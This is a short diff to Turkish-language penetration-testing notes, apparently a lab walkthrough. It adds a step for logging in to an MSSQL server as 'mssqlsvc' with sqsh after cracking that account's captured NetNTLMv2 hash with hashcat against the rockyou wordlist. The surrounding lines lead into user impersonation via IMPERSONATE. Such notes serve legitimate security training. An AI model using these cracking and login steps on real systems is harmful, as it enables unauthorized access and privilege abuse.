@@ -388,6 +388,12 @@ echo 'mssqlsvc::WIN-02:5700434aa4a14e34:EABEC1730FCFED43B49E3D78778EE60F:0101000
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
+**Şifre Kırılırsa kullanıcı adını açıklayarak giriş yapıyoruz `.\\mssqlsvc`**
+
+```bash
+sqsh -S 10.129.203.7 -U .\\mssqlsvc -P 'MyPassword!' -h
+```
+
 
 ##### 5. Hashi Aldık  MSSQL ile Mevcut Kullanıcıların Kimliğine Bürünme `IMPERSONATE`
 
